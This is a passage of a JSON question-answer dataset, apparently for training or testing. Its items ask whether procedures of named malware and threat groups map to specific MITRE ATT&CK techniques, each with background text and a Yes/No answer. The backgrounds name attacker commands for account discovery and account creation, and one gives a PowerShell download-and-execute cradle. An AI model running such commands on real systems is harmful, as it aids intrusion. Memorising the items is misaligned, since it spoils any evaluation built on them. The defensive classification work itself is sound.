    "parsed_raw_data": {
      "background": "System Service Discovery: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "question": "Is procedure BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem. a type of technique System Service Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Dok is packed with an UPX executable packer.  related to technique Create Account: Local Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Obfuscated Files or Information: Software Packing",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Software Packing: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
      "question": "Is procedure Dok is packed with an UPX executable packer.  related to technique Create Account: Local Account",
      "yes/no": "No.\nThe provided context is correlated with Obfuscated Files or Information: Software Packing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: Python: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors..\nAnswer in Yes or No.\n\nQuestion: Is procedure MuddyWater has developed tools in Python including Out1. a type of technique Command and Scripting Interpreter: Python",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Python: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "question": "Is procedure MuddyWater has developed tools in Python including Out1. a type of technique Command and Scripting Interpreter: Python",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Permission Groups Discovery: Domain Groups: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups..\nAnswer in Yes or No.\n\nQuestion: Is procedure POWRUNER may collect domain group information by running <code>net group /domain</code> or a series of other commands on a victim.  related to technique Permission Groups Discovery: Domain Groups",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Permission Groups Discovery: Domain Groups: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
      "question": "Is procedure POWRUNER may collect domain group information by running <code>net group /domain</code> or a series of other commands on a victim.  related to technique Permission Groups Discovery: Domain Groups",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SoreFang can enumerate domain accounts via <code>net.exe user /domain</code>. a type of technique Account Discovery: Domain Account",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Account Discovery: Domain Account: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
      "question": "Is procedure SoreFang can enumerate domain accounts via <code>net.exe user /domain</code>. a type of technique Account Discovery: Domain Account",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Babuk can enumerate disk volumes, get disk information, and query service status.  related to technique System Network Configuration Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure Babuk can enumerate disk volumes, get disk information, and query service status.  related to technique System Network Configuration Discovery",
      "yes/no": "No.\nThe correct answer is System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic..\nQ: Is procedure Mafalda can use HTTP for C2.  related to technique Application Layer Protocol: Web Protocols.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure Mafalda can use HTTP for C2.  related to technique Application Layer Protocol: Web Protocols",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine..\nAnswer in Yes or No.\n\nQuestion: Is procedure ZIPLINE can download files to be saved on the compromised system. a type of technique Data from Local System",
    "context": "",
    "output": "No.\nThe correct answer is Ingress Tool Transfer",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure ZIPLINE can download files to be saved on the compromised system. a type of technique Data from Local System",
      "yes/no": "No.\nThe correct answer is Ingress Tool Transfer",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Subvert Trust Controls: Code Signing: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system..\nQ: Is procedure Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.  related to technique Subvert Trust Controls: Code Signing.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Subvert Trust Controls: Code Signing: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "question": "Is procedure Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.  related to technique Subvert Trust Controls: Code Signing",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure TA2541 has collected system information prior to downloading malware on the targeted host. a type of technique System Information Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure TA2541 has collected system information prior to downloading malware on the targeted host. a type of technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Server Software Component: Web Shell: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client)..\nQ: Is procedure PULSECHECK is a web shell that can enable command execution on compromised servers. a type of technique Server Software Component: Web Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Server Software Component: Web Shell: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "question": "Is procedure PULSECHECK is a web shell that can enable command execution on compromised servers. a type of technique Server Software Component: Web Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Data Manipulation: Stored Data Manipulation: Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact..\nQ: Is procedure APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.  related to technique Data Manipulation: Stored Data Manipulation.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Manipulation: Stored Data Manipulation: Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "question": "Is procedure APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.  related to technique Data Manipulation: Stored Data Manipulation",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Proxy: Internal Proxy: Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems..\nAnswer in Yes or No.\n\nQuestion: Is procedure Turla has compromised internal network systems to act as a proxy to forward traffic to C2.  related to technique Brute Force: Password Guessing",
    "context": "",
    "output": "No.\nThe correct answer is Proxy: Internal Proxy",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Proxy: Internal Proxy: Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
      "question": "Is procedure Turla has compromised internal network systems to act as a proxy to forward traffic to C2.  related to technique Brute Force: Password Guessing",
      "yes/no": "No.\nThe correct answer is Proxy: Internal Proxy",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Woody RAT can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.  related to technique File and Directory Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure Woody RAT can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.  related to technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.  related to technique Container Administration Command.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Container Administration Command: Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.",
      "question": "Is procedure TeamTNT executed Hildegard through the kubelet API run command and by executing commands on running containers.  related to technique Container Administration Command",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Unsecured Credentials: Private Keys: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email..\nQ: Is procedure During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store. a type of technique Unsecured Credentials: Private Keys.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Unsecured Credentials: Private Keys: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity. An adversary with access to the device may be able to export the keys in order to impersonate the device.\n\nOn network devices, private keys may be exported via Network Device CLI commands such as `crypto pki export`. \n\nSome private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.",
      "question": "Is procedure During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store. a type of technique Unsecured Credentials: Private Keys",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure ConnectWise can record video on remote hosts. a type of technique Develop Capabilities: Malware",
    "context": "",
    "output": "No.\nThe provided context is related to Video Capture",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Video Capture: An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",
      "question": "Is procedure ConnectWise can record video on remote hosts. a type of technique Develop Capabilities: Malware",
      "yes/no": "No.\nThe provided context is related to Video Capture",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.  related to technique Internal Spearphishing.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Internal Spearphishing: After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.\n\nFor example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.",
      "question": "Is procedure During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.  related to technique Internal Spearphishing",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NOKKI uses a unique, custom de-obfuscation technique. a type of technique Deobfuscate/Decode Files or Information.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Deobfuscate/Decode Files or Information: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "question": "Is procedure NOKKI uses a unique, custom de-obfuscation technique. a type of technique Deobfuscate/Decode Files or Information",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Create Account: Local Account: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system..\nAnswer in Yes or No.\n\nQuestion: Is procedure GoldenSpy can create new users on an infected system.  related to technique Create Account: Local Account",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Create Account: Local Account: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "question": "Is procedure GoldenSpy can create new users on an infected system.  related to technique Create Account: Local Account",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Layer Protocol: DNS: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic..\nAnswer in Yes or No.\n\nQuestion: Is procedure Heyoka Backdoor can use DNS tunneling for C2 communications.  related to technique Application Layer Protocol: DNS",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: DNS: Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure Heyoka Backdoor can use DNS tunneling for C2 communications.  related to technique Application Layer Protocol: DNS",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
